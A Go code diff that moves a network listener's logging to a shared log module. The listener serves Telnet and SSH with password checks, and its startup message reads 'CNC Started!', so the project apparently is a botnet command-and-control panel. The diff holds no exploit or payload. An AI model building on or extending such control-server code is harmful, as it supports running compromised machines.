@@ -3,11 +3,10 @@ package net
 import (
 	"api/core/database"
 	"api/core/models"
+	"api/core/models/log"
 	"fmt"
 	"io/ioutil"
-	"log"
 	"net"
-	"os"
 
 	"github.com/gliderlabs/ssh"
 	"github.com/matthewhartstonge/argon2"
@@ -15,9 +14,7 @@ import (
 )
 
 var (
-	argon     argon2.Config
-	logger    = log.New(os.Stderr, "[net] ", log.Ltime|log.Lshortfile)
-	sshLogger = log.New(os.Stderr, "[net-ssh] ", log.Ltime|log.Lshortfile)
+	argon argon2.Config
 )
 
 func Listener() {
@@ -28,7 +25,7 @@ func Listener() {
 	// Set up TCP listener for both SSH and Telnet
 	tcpListener, err := net.Listen("tcp4", listenAddr)
 	if err != nil {
-		log.Fatalf("Failed to listen on Telnet %s: %v", listenAddr, err)
+		log.Fatalf("[NET] Failed to listen on Telnet %s: %v", listenAddr, err)
 	}
 	defer tcpListener.Close()
 
@@ -46,17 +43,17 @@ func Listener() {
 	go func() {
 		err := sshConfig.ListenAndServe()
 		if err != nil {
-			sshLogger.Fatal("SSH Server failed: ", err)
+			log.Fatal("[SSH] Server failed: ", err)
 		}
 	}()
 
-	logger.Printf("CNC Started! | Telnet: %s | SSH: %s", listenAddr, sshListenAddr)
+	log.Printf("CNC Started! | Telnet: %s | SSH: %s", listenAddr, sshListenAddr)
 
 	// Accept incoming connections for Telnet as well
 	for {
 		select {
 		case telnetConn := <-accept(tcpListener):
-			logger.Printf("New Telnet connection from: %s", telnetConn.RemoteAddr())
+			log.Printf("New Telnet connection from: %s", telnetConn.RemoteAddr())
 			handler(telnetConn)
 		}
 	}
@@ -83,7 +80,7 @@ func passwordHandler(ctx ssh.Context, pass string) bool {
 	passwd := []byte(pass)
 	user, err := database.Container.GetUser(ctx.User())
 	if err != nil {
-		logger.Println(err)
+		log.Println(err)
 		return false
 	} else if !user.IsKey(passwd) {
 		return false
@@ -98,7 +95,7 @@ func accept(listener net.Listener) chan net.Conn {
 		for {
 			conn, err := listener.Accept()
 			if err != nil {
-				logger.Printf("Failed to accept incoming connection: %v", err)
+				log.Printf("Failed to accept incoming connection: %v", err)
 				continue
 			}
 			ch <- conn
